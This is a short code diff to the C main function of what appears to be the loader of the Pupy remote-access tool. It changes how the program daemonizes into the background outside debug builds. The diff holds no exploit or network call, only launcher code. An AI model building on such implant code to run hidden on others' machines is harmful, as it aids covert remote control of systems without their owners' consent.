@@ -1,10 +1,9 @@
 #include "pupy_load.h"
 #include "daemonize.h"
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[], char *env[]) {
 #ifndef DEBUG
-    daemonize(true);
+    daemonize(argc, argv, env, true);
 #endif
-
-	return mainThread(argc, argv, false);
+    return mainThread(argc, argv, false);
 }
